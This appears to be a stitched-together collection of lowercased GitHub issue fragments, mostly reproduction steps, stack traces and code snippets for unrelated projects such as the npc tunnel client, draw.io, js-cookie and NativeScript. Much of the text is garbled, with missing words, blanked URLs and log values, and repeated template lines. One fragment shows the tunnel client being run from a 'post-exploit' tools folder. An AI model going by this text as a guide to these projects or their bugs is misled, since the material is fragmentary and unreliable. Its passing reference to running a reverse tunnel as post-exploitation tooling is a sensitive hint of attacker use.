- start a new task with many urls (1000+), each of them is about 1mb
download the url:
[~] # ./npc
sigill: illegal instruction
pc= m=0 sigcode=1
instruction bytes: goroutine 1 [running, locked to thread]:
github.com/klauspost/cpuid.getprocfeatures( , , , , , , , , , , ...) /home/runner/go/pkg/mod/github.com/klauspost/cpuid@v1.3.0/cpuid_arm64.s:15 fp= sp= pc=
github.com/klauspost/cpuid.addinfo( ) /home/runner/go/pkg/mod/github.com/klauspost/cpuid@v1.3.0/detect_arm64.go:42 + fp= sp= pc=
github.com/klauspost/cpuid.detect() /home/runner/go/pkg/mod/github.com/klauspost/cpuid@v1.3.0/cpuid.go:289 + fp= sp= pc=
github.com/klauspost/cpuid.init.0() /home/runner/go/pkg/mod/github.com/klauspost/cpuid@v1.3.0/cpuid.go:272 + fp= sp= pc=
runtime.doinit( ) /opt/hostedtoolcache/go/1.15.2/x64/src/runtime/proc.go:5625 + fp= sp= pc=
runtime.doinit( ) /opt/hostedtoolcache/go/1.15.2/x64/src/runtime/proc.go:5620 + fp= sp= pc=
runtime.doinit( ) /opt/hostedtoolcache/go/1.15.2/x64/src/runtime/proc.go:5620 + fp= sp= pc=
runtime.doinit( ) /opt/hostedtoolcache/go/1.15.2/x64/src/runtime/proc.go:5620 + fp= sp= pc=
runtime.doinit( ) /opt/hostedtoolcache/go/1.15.2/x64/src/runtime/proc.go:5620 + fp= sp= pc=
runtime.doinit( ) /opt/hostedtoolcache/go/1.15.2/x64/src/runtime/proc.go:5620 + fp= sp= pc=
runtime.main() /opt/hostedtoolcache/go/1.15.2/x64/src/runtime/proc.go:191 + fp= sp= pc=
runtime.goexit() /opt/hostedtoolcache/go/1.15.2/x64/src/runtime/asm_arm64.s:1136 + fp= sp= pc= r0
r1
r2
r4
r6
r20
r21
r22
r26
r27
r28
r29
lr
sp
pc
fault **client:** - os:
[~] # cat /etc/issue: welcome to ts-212p3(192.168.123.123), qnap systems, inc.
[~] # uname -r: 4.2.8
[~] # uname -a: linux ngts-4b 4.2.8 #1 smp sat oct 24 01:50:39 cst 2020 aarch64 gnu/linux - arch: aarch64 - tunnel tcp - version 0.26.9
processor : 0
model name : realtek rtd1295 quad-core arm cortex-a53 processor @ 1.4ghz
1. cp
2. ( )
3. , , : 1.tcp , cp/udp ( , ),
2. ( ), ohup ,
git clone ' --recursive
rename main to other package name
gomobile bind -target=ios ./cmd/npc
link sdk to ios project
opening './npc -server=1.1.1.1:8024 -vkey= '
ps d:\\software\\tools\\post-exploit\ ps> .\ pc32.exe -server=1.1.1.1:8024 -vkey=111111111111
2020/06/15 19:13:57.962 [i] [npc.go:231] the version of client is 0.26.7, the core version of client is 0.26.0
2020/06/15 19:13:57.979 [e] [control.go:94] config file conf/npc.conf loading error open conf/npc.conf: the system cannot find the path specified.
1, ps 2, ps
go get -u ehang.io/nps
go build cmd/npc/npc.go
ssh aliyun -p 8001
root@47.100.xx.xx: permission denied (publickey,password).
1.
2.
3.
run the connection command to the server on the client-side
cp,udp,kcp
cp dp pc dp `[d] [client.go:211] new udp connection with the goal of p: , remote address: p: ` x n
`[e] [client.go:172] get connection info from server error -1`
dp dp
rp dp . ps dp
./nps install
nps start
2020/02/22 12:24:36.406 [e] [nps.go:134] valid actions: ["start" "stop" "restart" "install" "uninstall"]
failed to start nps : "service" failed: exec: "service": executable file not found in $path
, docker
forward client dns port to local
try to resolve fqdn w/ dig or nslookup
a-b.test.domain.com b-c.test.domain.com
caddy
use kcp as transport - server side ```
bridge_type=kcp
``` - client side
conn_type=kcp
![q_s~r4_2_c9aj_s3w_pz~et.png](
![un__7_w_zn_hb_o@45`o_ku.png](
| .25.1~0.24.0
i have prepared a simple example to reproduce, change the camera elements to see different cases: ````html
<!doctype html>
<script src=" "></script>
<script src="aframe-ar.min.js"></script>
<script> window.onload = () => { let scene = document.queryselector(\'a-scene\'); if (navigator.geolocation) { navigator.geolocation.getcurrentposition(function(position) { let box = document.createelement(\'a-box\'); box.setattribute(\'gps-entity-place\', `latitude: ${position.coords.latitude - 0.001}; longitude: ${position.coords.longitude +0.001}`); box.setattribute(\'scale\', \'20 20 20\'); box.setattribute(\'color\', \'red\') scene.appendchild(box); }); } } aframe.registercomponent("markerdebug", { init: function() { this.el.addeventlistener("markerfound", function(e) { console.log(\'found\') }); this.el.addeventlistener("markerlost", function(e) { console.log(\'lost\') }); } });
</script> <body style='margin : 0px; overflow: hidden; font-family: monospace;'> <a-scene embedded markerdebug arjs='sourcetype: webcam; detectionmode: mono_and_matrix; matrixcodetype: 3x3; debuguienabled: false;'> <a-marker preset='hiro'> <a-sphere position='0 0.5 0' material='opacity: 0.5; side: double;color:blue;'> </a-sphere> </a-marker> <a-entity camera gps-camera rotation-reader/> </a-scene>
</body> </html>
go to [aframe basic example]( or [threejs basic example]( using an iphone.
press the home button.
wait 1-2 seconds.
re-open the safari from the desktop icon.
go to '
scan 'hiro' marker
add this to the html page
`<script> window.addeventlistener("resize", () => console.log("yeet")); </script>`
open this diagram:
ungroup the object
check if it has been ungrouped, for example try to drag the bigger part
it is still grouped.
create a new diagram on [draw.io](
select the pdf export via _file_ --> _export as_ --> _pdf..._
just click the export button in the following popup
a new browser page is opened, showing the error message
go to 'file'
click on 'export as'
select 'pdf'
select 'current page' unselect other options
click 'export'.
select 'download'.
open downloaded file with any pdf reader
open [this example]( #r7vtdc7i6f%2f01ntnnoh2%2brlwuv63aqq3a3ifeiascefh89w%2biuefpn%2frwep521a7cstiesnfk3ig9esvouufrntxfbka3amesb8tqjsdwiszrh4zemcjlmwl60iixptcegxcdsbulnecqqugwrgr6wvdhrgt0kse038erbluzrtmrepojjochrqfjdawnyu1qrsju8saappvcmzdluxjhsyrhdxjymofxkuis3ygvh2oy23pwfyby7yx9ep8xamgzn2b7v3%2bnutiyvqrcuky3u%2bx7cqqlzvlrls%2b3qdvta5ekr3oswehibfubo3bthmzz7is5zzyrtafomdvlo5ne8rosf0ucfnwgw%2f8p87y3tqcz5kbeva9c0rcc%2bpdiokbyp8inihlbd8um6fp3gdilock0vewaeodfbp6mq9ekmlc1iqalbq34kzd5dncfcmnwjbdr8ps20t2t%2ftbzixujw5phnvncbw0ty5rc09rpkiyi7a7djsawkllniqq%2bgdrjywiatmvvbxogk1o1gnbp7wn2f2fgrftvivcsqybcld3nuyvijgnfipu%2bzkb6rrps%2b0mvvfcdvhwxz5xbps7tsryfblg6rp%2bquwdqdvpm9xglnw27%2f7lsfn3hkjrp6hwlruribcr2pwvtllrnwqkkhydgb0jjodyls7pmwuwi3snvyr0t7lm9bpok1ldgdjr6usd8s5i3xhe00jxw1ewjicepd%2f2c%2fntcfks71qta2pkfrdpdsf04ky61jdeyo2gpj4vcjcgcapf0krclpdyqpntmcl7o15hw1aua3hilpawozbmijbx46hsislt5afjfrlstq76gvxt%2bbhxdunynbaviwvbkgtxx%2f2v9qhxsg1tpsrz77npnr3jw9bebpwgparcprmweyoca7iazoyagschsmarnavi13tz9vhsn5ooudpktbdha%2bmwayrehxy1ywzcaibxhhtqkkvabb6x5%2bihjqeobrn3frizkp8aoih5eq8slkhlrv6z8yqjnq72m8lymwskjtqyilvzu883 %2f7kd3fsnjzmotvghu5g1u47ub3404k0rwpqzo2jumxj3xeiwg33mctbfahyvvmxsn1a7zndy%2fp%2fphfboxqkjpw1n5gtbt5xqygvq9npxu0corxyanr1cbjaaneo43x73gnntb486g75tuedvmnxqjvvkzwy19ovdxqf9r7%2fx1qipfvf0db5clgw%2bxeudke7uy4%2b00ypgmdy%2f8rjh0elb88p35ajqsqxco8tlougsj6ykasfubltijhisw9vjrjg2mghw1z2e7mid0dxguvyzknbebl40lqzqmcmn8rk%2fd5y1yf3%2bypn3gpu5e0qpyoc7epn0omqdwrrpkmbmf8dni%2bflojmvrk2swtiuzz90pyobovhrxybm9ldtrpka0uvwmrsu%2fi9gvhb8ignpgenir0gxpegfgufpdc5hn7lyucb0pdd0slibjbehz4klbs3ibcmb9vttvxdartcejtxghrwgovtzwewaoqu21syzz3vc86virxumbamrpl5hf89omp9xum1j%2ftg%2bc1u69mk9p9rwspdur9rpzmndhjkhydcjvojmhr44xwxxxbru2zqat9yvbhvdmuodbm6nm%2b1j9ot2slh9llwnxos02qvgh3ecbvcag7iqsjz6sx1ffpy2%2fbgqfbasfykzbzek%2bepbitjxqkhytebr%2fl3jcm8zffuc%2bps%2fx9pmc%2bihkcky%2finyofsjh%2bif%2bv%2fasnja9k9fs%2bzo9n%2bts2bmiqjene86bk5k%2fy9tlv2u0rnswbus5s3gtulk6kdtah6ntqynsiewviez5e1nlvf7t89nkfmljyxuxn4uvvisq5fpea%2f1gblunhwcnztvpg4smcz83gyuahz7o5qhcm4wuovvcgjfl1cxhim1xuya2uuwliu6a5f6t3jp0rth4x%2fpzjfcwv0tbjt93j0mjosyx8%2bno%2bd9etpphb75%2fthg96oyxroznotj8gdbmmiwlk1gbad4ps1uyewy4rolosascqccv48ufhv2l1neh9eszjsshhhfen%2b6ybtxhq3ekwu8wmq2fwvoeis1yqzjhhxef%2boglts32q%2bv4vo1bldp4bd6ktsxs7dcxsivlib2%2bpmv2przhufro0ngn1shhvocxvg4%2bqbitmz5se3xixp75zydi4wokerhmf%2btksud86iogwya%2bzeznz8czwudblai%2b9uctstxwmihgsizemvqfffplc1vg8%2buz5eo6qsdp6phsjr2s%2fbl1kd6phspl1epirji3hxzouzp8k0h89hljwpm99owsnlei8hbd%2fgahalrroeiy%2fqpevyu6ujg%2fklhc3%2b%2bwotuzs4%2fiz1ctyzxwaenjw5j0liofkypzgploinhh8qwlko63x2bkho93bth7%2brsimhdvjwwt%2fhacfsvlepsxrtmqz88qghsuonrszjdmaxw5mud%2ffh36bmpyirksshklx1lolusyl13cdjcy%2flh%2bzwqsb8xte%2fquxul9wpihpl%2b%2fmt3yx8lum844lit%2fgi55c4h%2bcftr984qvzsusvpfrbu%2feb5b%2fmaheqsczh02horof6cb6oh%2bv6d31ff%2fhc7w%2fgc%3d)
file->export to->vsdx
open the resulting vsdx back in app or .vsdx viewer.
go to 'arranged'->'insert'->advanced
click on '.mermaid..'
enter the text shown above
no diagram generated.
go to '
click on 'create new diagram'
click authorize
a new window appears to get your github authorization.
the same new window displays _this window will be closed automatically._
close step.4 message window manually
see that authorization window still persists to get authorization.
close authorize dialog using 'x' mark
see, access denied **draw.io version**
- draw.io version [13.0.1] **desktop:** - os: [windows 10] - browser [chrome] - version [80.0.3987.122 ]
create a diagram
ctrl + v instead of pasting the figure, it pastes its text representation.
change the line to to 'curved'
try to move the handle affecting the angle of the of the end of the line (attempt to move the handle creates new way-point instead of changing the tangent angle)
click on [this link]( #r%3cmxfile%3e%3cdiagram%20id%3d%22vqjhcs3_58a44feqafcx%22%20name%3d%22page-1%22%3e7vxtc%2boofp41fqwtic%2f68wrb3tvbnd693b39uemngrzjccje2%2fvrfwxeexjn60sck7yzlrna4dmhh3mc9na4evstwfpgt%2batsact%2f62hbnsqag8c8u9k3pueijhkzgn1lwwjekk%2fibjasrqkplnkmnlgqk7neegextgz8jwmjwlb5bnnwzj%2f1jmeeupwnmghkx2mpg%2bu1hxszypfcz0f%2bqubo0yfrfjnvl1zbnhnqy0ruuuhcciytz9fb2msyuhta5owu694mrusitgvu%2bbu%2fop73wf6fn8e2qpv7p%2b%2f8nc%2fblqtp3g4vd2%2bxry%2f4avrjebveigchoxie%2bihuckwsu9kvzzizr2tiqml6er9dvelcud48jpbfxizkcxiucxiiovxhl1moyqgyzrlmb%2fheq2ltvwgiy9jrmrkm4dmhkm6i0viijpokrqbc%2fk0eptjnexttvcwtb%2bw5ihguntgqpck4estcvhaborqz8iiwpn3kuuxsdwqspdtjfrqszgqk8qclz1wvdmsdhgw1b1bs3xqgh0apnib91nwhndrgdxkgpe45pmln6bbbzstpzmeyprkjjeyktpccq6a8xhgqvswnfbiarrqs4blg6gqx%2fcesqpb3ajl32jjhn9t2yqunjlwozoqarl76iliu1vpaukstlc2cjciok9smuzijr4roxbtnbg%2bi9%2bwhnsehjjtn%2fl2hb0gx7cmr3fntnikvkitlux8z7ult8w2nkxps6hjw%2fi6gpycbjwmerrsriglpgazfupwbintpwah4ruu%2bivj8ptwhjmjmv9s1fxncrzwmpztmh2hdgh8tmqnkmrt%2b7x2da0ubh3h0jjfikyhltrygimvac16aq39b%2fzolnjwhspmxnvqjjbo9jfij3xhbu2brqxn6inwrh5exjk%2fuzjpskb1xqlzillftbkatpsafzxj4tde8wv9wbdqzoke8jqemc5zpdvwde0%2b%2f%2fxt9u8zz25oh5yd9g%2bn%2bkfdphjxphi7jolhieynhb3zushvykshbqw1fn3mervmx7ewunuapmdbrojophsgu9kdeyp5rnoorwxrpszgexqueq6o75n4rqfcus6z3ivlfk10rujp9gdscsnyrjphig02afensyd8zglrdezxobghsisi1fatq7qpllev7ram7drf8we34w0tl2nl3r%2fu8xphjnswye0aazg4ptnl01 %2fshyiiiiqa9zxvm609braosqmex7lrn8bh6mgep1izdrncmkyg%2bgyvp3ijrdquc5t0ct3mltuewvawjlsyvahneeqxq0koziuxdzbw9wi4erpyepldid07t9gagljt6oay9dc6bhrinul3y6cbb5laplq71jt4xnulfbtrdwid%2fbfej3y0cnq07arpaaglqutrugmbksuomi3btlszcdde1oeyj7zpkhowmxrfdzbw%2fmlh1%2fhat%2ffb %2bgjrpvfyh%2b6m%2fiwu2dmtknqn%2b2y44dr4qensaozwlbhekbmelwjhypqa7lkfefs6egfxg8npdqobr26pfcwjnocfqypuywlnqmjsvcjusgyo%2fbrofbi%2bpecklwlp56gwi88%2fijafjya1y03nrvvgpvfam0nkr09xas9fpddxwa9daha09ddhqca0e4aykvettl1n9zv7zy87dspt3dlkapae9kxu7yzfhxc8pdg5n86m4nhsdkg6ashx9sdsjjzwqfwvffpzrfvqrzne5v2qu7%2bu%2fx3sgv39ttvxxlqvf2n1retuzvdrfnjnz3mp7ow6xrbtniuzzajey8v%2f8mreyuatv4qjlfsar%2fzxisgo7cqvlhoxyhv5licxfeqa9vl0fm4w3abdylxx6jrv562gawyqqtdol%2bqco%2bhdoi7v6t4otsvgr4gvrse5u5gvdlxoy9pfck5ux84xyfs7nfgd%2f8d%3c%2fdiagram%3e%3cdiagram%20name%3d%22page-2%22%20id%3d%22fqdu4zqigvi5b5azwcen%22%3e7vzbcui4ep0ahkpzki%2fwojbkdquynvpj7mzjliifagmsyhzdkq9fcuu%2byseimedetlivdlgq%2b3trdldkd%2bb09fg1ruvlpzta4qbywemaxg4ash1g83%2bi5knw2bcknyuybliur7gjz1hwwrj2qwkcldoyskng1uxkgy0ipgolohthdfvunqdh%2bvvxaig1irszcvxaxyrgs3ublpu3%2fixjyim%2feutkhns0e1jedbpj7xsaon%2f9pm0rpmas%2fzmlcui2uawvbnaau8rst6vhkq6fcjxynn%2f8%2fpcwuomfydxd8%2b0v72ksxf6kg10fckl2hzgowlnds6j%2fohajxxmjglphczb3zj6unjdsffjp9gbodkldylyllzk5imkmrshmfg7rpq4nmzsnnkqxb4pohmvllkypgwrcmpm5jdg1wpfqqojphacoqrjaqp0tuqgqlcjemhfp4didwfq0rh4xqsehhcb%2bhgyxnl4hkvdniaeapad%2f4jjhx4j2syf%2bxxsfwfzeu8jwsticztywn5a3bu2eblq3lcih0keklx%2brdz0jyd9iea8afpaangkosnwza%2bpogh7bspwgaxbul4thuzwaifkwy42l6bgq2%2b%2ba%2bfga%2bqamoftjkkrlsfbznabwwpllfqvcczi9bgck2turu0hxfgup6bev4yiqrxzakrqzqnuymgndxdo8p58nxqiul%2fde8sqaqjp7gy5xibj5u2b%2fxmhznlp7o%2bqt7iwr8ypgv7nontto%2fi4bntkmv63oazxrjxrydbdlr1w4jffirmo2pasaofaqr%2b1hzkov5ldcxfoljtftocoakoglhzg%2fi4p88xadshajewc5rqqj5vqrte3tkqnkvcbye6j7ssmwrejutfsdfrltjkqxjaxu0bpdcglzbzk9qnkebw3kmfdh6uki%2fgbpjma1r%2bncaebsid%2fslxdirpldmu74td%2bvrthz1q1kwebtyyjwcbnfzvb0wxfvingemkzxso%2flrv2xv16migrio%2fcl7jp7ekfygxxycrwc3xfw6hwhcksvzly1tbzlugawrakmv0vwvstuthwbf7vlycddrritbvbc3i6t19zkoxrvdy4l5zkdhzvulyqiclttciyc%2fmwwplxzkbot%2fsefn7w4ybl8ylnetvmy%2fxpdyzalez86ijtsmvfjlraq%2fhb30tlwaxvme2a4q37n4w56civ1g4yubket4lcxpyotji7nnydd%2bmrbo8k2oll0zeckytbb6xoeypqucrqpqf5wtn1rafmw7xgb9ogj0nnkvfxhwzg0aitqbr7vj8vdp3chr6yorhp23%2fxcnrm2wka15x1mrmf37khxbx%2fddj7s80cffh99vd%2f68iwvotxrr%2bctn2ndimlz4lpnu0qkeijze8mnjpishsmibj6zsicexe2j5gaigrsrqluiboj4djqnbyahrzqen7wpizwqnj6cvkuljpdfujiqczi%2bo9dz2kfmml%2b6cxh%2bdtozqz2hhcphmxf%2fia7reg4wukak5byqgflzlhej7imkw0rsdyzg3qnq %2ffgj3gqgria%2fy7yigvmpk4liniizgnssmp2d7evvujoaoqir27q0hogeaexi7mmrgxorqfhjte5sdjyageqb41tmgofxrkjp3iuh0y%2b2j5hmtscwfcwpouj2ur9td%2ft2pvinholketizh9ermx3jeokvw%2binm9whx9xsooxb2u4crs4fqypyowkd2afroaftp0ay8gi%2bxdovdfygemuy%2fw3zahdaljhuweyl51erspa3eailpu5inemnhs0k6%2b1osndtxu4nh1%2ffvxk3zypv21bjx8eqp0vv04gj7ao6edv22ysgj8g9gsfxo5ixshcxq%2beu2rlin7xrtxzav2vjly%2fpxjbrddvgwoblv9rzlozfb8y2rdav7htuey%2fvmpdp0sktvfybsdahzeykp8vyjuvwipvf%2fixd8vght35ilwr3qpuk5303n6ecsewd3%2bwbo6xdsenbqmx0egbqrret0%2fdlxc%2bbau4dt02c6kmfi1gl%2bitkpxtdph6eekvhuukx5nj5%2bjhtwljvw8gwtf%2fm3cqeotv7ec3j1pw%3d%3d%3c%2fdiagram%3e%3c%2fmxfile%3e)
select file->export as-> pdf.
ensure "all pages" is selected
add an personal drawio application on gitlab.com
open draw.io with url parameter, for example:
hit "open an existing diagramm" and "authorize"
the gitlab-page opens with "an error has occured" and "the the redirect uri included is not valid."
go to
add a diagram with multiple layers
from the menu select file->export as->vsdx
load the vsdx in a native vsdx rendering tool, only the active layer is displayed.
`cookies.set(\'name\',\'value\')` > `"name=value; path=/"` `cookies.get(\'name\')` > `undefined`
steps to reproduce the behavior: 1
go to '...'
click on '....'
scroll down to '....'
steps to reproduce the behavior: 1
i give data from the server.
send my data to a function to set the cookie.
after setting the cookie, i redirect the user to another page(not with hard-reload).
everything is ok here.
i reload the page, but the cookie is not there!
if i reload again for the second time, the cookie is back!
steps to reproduce the behavior: 1
go to '...'
click on '....'
scroll down to '....'
steps to reproduce the behavior: 1
go to '...'
click on '....'
scroll down to '....'
go to any site using `js-cookie`
go to console and manually set cookie like so `document.cookie = 'param=%a8'`
refresh page
steps to reproduce the behavior: here's the code on how i'm setting my cookie: ```
export function setupsessiononloginandsignup(response: iloginsignupresponse, dispatch: function): void { const { payload, meta } = response; const { exptoken, issuedate } = meta; const { user, token } = payload; dispatch(onsuccessloginorsignup(number(exptoken), number(issuedate))); dispatch(setupuseronsuccessloginorsignup(user)); cookies.set(process.env.react_app_cookie_name as string, token, { expires: new date(new date().gettime() + number(exptoken)), secure: true });
go to '...'
click on '....'
scroll down to '....'
steps to reproduce the behavior: 1
create a cookie
`cookies.set('cookiename', true, { expires: 91 });`
check the browser's cookie in application memory
```js cookies.set('foo', 'bar'); cookies.set('strictfoo', 'strictbar', { samesite: 'strict' }); cookies.set('strictfoowithexpires', 'strictbarwithexpires', { expires: 10, samesite: 'strict' });
steps to reproduce the behavior: 1
go to '...'
click on '....'
scroll down to '....'
added reference to 'js.cookie-2.2.1.min.js' or 'js.cookie.min.js (v3.0.0-beta.4)'
try creating a cookie like 'cookies.set('name', 'value', 100000);*
it will throw the above error saying **js.cookie.min.js:2 uncaught typeerror: u[f].split is not a function at object.o [as set] (js.cookie.min.js:2) at htmlanchorelement.<anonymous> (default.aspx:47) at htmlanchorelement.dispatch (vm3405 jquery.min.js:2) at htmlanchorelement.v.handle (vm3405 jquery.min.js:2)**
install js-cookie
import cookies from 'js-cookie';
cookie.set('key','value',{expires:10}) ;
in web browser, the cookie will only be lived 7 days if you set greater than 7 day
it's working fine for less than 7day.
`cookies.set('my-cookie', 'my-cookie-value', { domain: 'localhost' });`
`var value = cookies.get('my-cookie');`
`if (!value) { alert('could not read the cookie value'); }`
reduce div width from "100%" to 0 in 2 mints
start the animation and move your browser in the background.
wait for 1 mint in the background and do any things 4
again come back to page see animation will be the same place where you left.
open this demo, and it looks like the first step (from 1 to 2) takes less time than other steps.
select any fields with datatype = date / datetime, with database aws athena.
- create any element
- apply animate with iterations of any number
- animates once
(currently trying to reproduce it in a minimal sample)
open the playground app
type something in the text view
close the text view
focus the text view again -> text from before disappears
see this playground.
for the app crash - put `ispassthroughparentenabled="true"` on a `flexboxlayout`
remove that or switch to a different layout and the app will function normally
for the button tap propagation - tap the buttons in the [playground]( from the [gestures documentation]( see the background color change and the console log.
basically; have a page with a background-navigation, and create a css file with `bottomnavigation { background-color: blue;}` this page has a button in it that navigates to another page
this next page can use my ns-theme loader, or it can manually create a new css element that is `bottomnavigation { background-color: red;}` and load the addition css (which changes the backgroundcolor)
add a '$parents' root binding inside one of application pages (e.g
$parents['frame']).
then, build and install application using the following command:
tns build android --release --bundle --env.uglify --key-store-path <path-to-your-keystore> --key-store-password <your-key-store-password> --key-store-alias <your-alias-name> --key-store-alias-password <your-alias-password> --aab execute command again after removing '--env.uglify' to notice the difference.
this is an example where parent of current page has its own binding context:
<stacklayout backgroundcolor="#fff" visibility="{{ $parents[\'frame\'].isbusy ? \'visible\' : \'hidden\' }}"/>
<activityindicator busy="{{ $parents[\'frame\'].isbusy }}" backgroundcolor="red" width="50" height="50"></activityindicator>
works perfectly fine for activityindicator.
reproduced on simulator (doesnt have a real device)
add two styles:
button { color: #ff0000;
} .ns-dark button { color: #00ff00;
[use this playground demo]( or the following structure: ```css
.defaultcssclass { background-color: #79d2a6; highlight-color: green; selected-item-color: yellow; un-selected-item-color: blue;
} .newtabsclass { background-color: orangered; /* works on ios; not working on android */ highlight-color: lightgreen; /* works on both */ selected-item-color: whitesmoke; /* not working on ios; works on android but only after tab change */ un-selected-item-color: pink; /* not working on ios; works on android but only after tab change */
and then change `defaultcssclass` with `newtabsclass`
```typescript
export function onbuttontap(args: eventdata) { let roottabs = getrootview() as tabs; console.log(`roottabs: ${roottabs}`); roottabs.tabstrip.classname = "newtabsclass";
``` where the tabs is the root component (or not) e.g
app-root.xml
<tabs> <tabstrip class="defaultcssclass"> <tabstripitem> <label text="home"></label> <image src="res://home"></image> </tabstripitem> <tabstripitem> <label text="settings"></label> <image src="res://settings"></image> </tabstripitem> <tabstripitem> <label text="search"></label> <image src="res://search"></image> </tabstripitem> </tabstrip> <tabcontentitem> <gridlayout> <button text="change tabstrip styles dynamically" tap="onbuttontap" /> </gridlayout> </tabcontentitem> <tabcontentitem> <gridlayout> <label text="settings page" class="h2 text-center"> </label> </gridlayout> </tabcontentitem> <tabcontentitem> <gridlayout> <label text="search page" class="h2 text-center"> </label> </gridlayout> </tabcontentitem>
``` **result** background-color: orangered; // works on ios; **not working on android** highlight-color: lightgreen; // works on both selected-item-color: whitesmoke; // **not working on ios; works on android but only after tab change**
un-selected-item-color: pink; // **not working on ios; works on android but only after tab change**
deploy a fresh drawer navigation template from [ on a device with a dark mode turned on
open the sample app, tap the button to start the http request and after 5 seconds you should see the error message on android 6+ and on ios, but on android 4 and 5 it will continue until 20 seconds.
will try to find most succinct repro soon.
just open the sample app provided below.
create an instance of `xhrhttprequest` and add an event listener for `readystatechange`
```javascript
function reqlistener () { console.log(this.responsetext);
} function reqreadystate() { /// do stuff
} var oreq = new xmlhttprequest();
oreq.addeventlistener("load", reqlistener);
oreq.addeventlistener("readystatechange", reqreadystate); // <<--- this throws an error
oreq.open("get", " ");
oreq.send();
once the app loads, immediately tap on the 'archives' tab at the top of the app
**please ensure you tap and do not use gestures to swipe to the tab or you will not reproduce the bug.** once on the 'archives' tab, try tapping to navigate to any other tab, and you will see that you cannot
however swiping navigation does work, and after successfully navigating by gestures, tap navigation also begins to work as expected
<img width="375" alt="img_0001" src=" "> <img width="375" alt="img_0002" src=" ">
use[ this test playground ]( observe the styles in **app.css**
run this test
[use this playground]( and press the button to trigger the title change
works on android - not working on ios
reported via t
tap the button, open via email and see that everything is printed on the same line on both android and ios
run a simple tabs example and set the selectedindex
dialogs.action({ title: "reminder", message: `message`, actions: [ "action1", "action2", ], cancelable : true, cancelbuttontext: taskstatusprompt.dismiss, });
- use [this app ]( with tab navigation)
- observe [the css files for android]( #l4-l13)
- **remove/comment** all **image** tags from all **tabstripitem** elements (e.g
[here]( #l7))
- press on any tab - as a result, thapp will crash with ```
system.err: an uncaught exception occurred on "main" thread.
system.err: calling js method onselectedpositionchange failed
system.err: error: undefined is not a valid file or resource.
system.err: system.err: stacktrace:
system.err: push.../node_modules/@nativescript/core/image-source/image-source.js.imagesource.fromfileorresourcesync(
system.err: at push.../node_modules/@nativescript/core/ui/bottom-navigation/bottom-navigation.js.bottomnavigation.geticon(
system.err: at push.../node_modules/@nativescript/core/ui/bottom-navigation/bottom-navigation.js.bottomnavigation.settabbariconcolor(
system.err: at (
- use [this app ]( with tab navigation)
- observe [the css files for android]( #l4-l13)
- press on any tab - as a result, the label will disappear.
just see the sample app provided below.
this bug is only reproduced on ios devices
go to background from the app
go to "most recently used apps"
preview test app and "?" values are displayed instead of normal values.
go to background from the app
go back to the app
"?" values are displayed for a short time until normal values are loaded
create a `bottomnavigation`, with a `listview` on one of the tabs.
add a page-route to another page (full page, not tab content).
navigate to the other page
the listview can no longer be scrolled and the items cannot be tapped.
switch to another tab and back again.
the listview now can be scrolled again
(if you tapped on an item, that action is triggered)
create textfield with keyboardtype="integer"
it can also be reproduced in [playground](
create a new application and add bottom-navigation inside and add the following style:
tabstripitem:active { background-color: red;
run the application on android and select the second tab
the background of the initial tab stays red and does not return to its initial state
[playground demo](
<textfield text="{{ foo }}" autocomplete="true" />
- deploy on ios phone/emmulator (works on android)
- [use this playground](
- scroll to the bottom - you should be able to see the "end of content" label but it is hidden behind the tab strip.
`<image row="0" column="0" colspan="2" src="{{ thumburl }}" stretch="aspectfill" width="200" decodewidth="200" loadmode="async" usecache="true"></image>`
i'm seeing this behaviour in a nativescript-angular app on android
html: ```html
<actionitem icon="font://&#xe161;" class="action-bar-icon" [class.disabled]="somecondition()"
></actionitem>
``` css: ```css
.action-bar-icon { color: #ffffff;
.disabled { color: #666666;
launch the playground on android device, rotate the device to change orientation of screen the label disappears.
use the following test app -
the background color of the stacklayout and the text color of the label should be the same
using the light theme in android 10 you cannot read the text
if you switch to the dark theme, the background color changes and you can see the difference
tns run android
`tns create app --ng`
`tns debug ios`
open url and make a livesync
open the elements tab and change the title
you will see that it doesn't apply on device/emulator
start the application
tap the button "navigation-animation-slide"
put the app in background by pressing the home button
bring the app back to foreground (recent apps)
tap the first item of the list
a second tap crashed the app appstart:
![screenshot_1574156233](
after navigation:
![screenshot_1574156241](
press home button and activate app (recent apps):
![screenshot_1574156276](
tap the first item:
![screenshot_1574156291](
![screenshot_1574156295](
second tap:
![screenshot_1574156299](
using the provided sample project:
open sidedrawer by pressing menu button in actionbar -> open menu item settings -> use back button in actionbar or hardware button -> try to open the sidedrawer again
i have a vue app with a grid and a `v-if` and a second grid with a `v-else`, i believe this occurs with the v-else grid getting created
switch it to `v-show` seems to have fixed it.
i use the v-if/v-show to use a different grid for landscape vs portrait.
create a webview using `ui/webview` and load a page which is accessing `window` object
let say just print `window.navigator.useragent`
but, it will not work.
create a component with html:
<scrollview> <stacklayout> <label textwrap="true" height="5000" text="i have a border and background color" style="background-color: #eee; color: red; border-width: 1" /> </stacklayout>
</scrollview>
run `tns run android`
add "nativescript-dev-webpack": "^1.0.0" to angular project
create a component with the html:
<actionbar class="interit-test"> <gridlayout class="inherit-test"> <label text="i want to be red"></label> </gridlayout>
</actionbar>
add this to the css file:
.inherit-test { color: red;
see that the label isn't red but black.
.ns-root button { border-width: 1; border-color: red;
create app that use tabs
select one of the tabs except the first one that is the default selected
minimise the app e.g
open another app
go back to your app with the tabs ``` <stacklayout> <tabs height="400px"> <tabstrip> <tabstripitem> <label text="home"></label> <image src="res://home"></image> </tabstripitem> <tabstripitem> <label text="settings"></label> <image src="res://settings"></image> </tabstripitem> <tabstripitem> <label text="search"></label> <image src="res://search"></image> </tabstripitem> </tabstrip> <tabcontentitem> <gridlayout> <label text="home page" class="h2 text-center"> </label> </gridlayout> </tabcontentitem> <tabcontentitem> <gridlayout> <label text="settings page" class="h2 text-center"> </label> </gridlayout> </tabcontentitem> <tabcontentitem> <gridlayout> <label text="search page" class="h2 text-center"> </label> </gridlayout> </tabcontentitem> </tabs> </stacklayout>
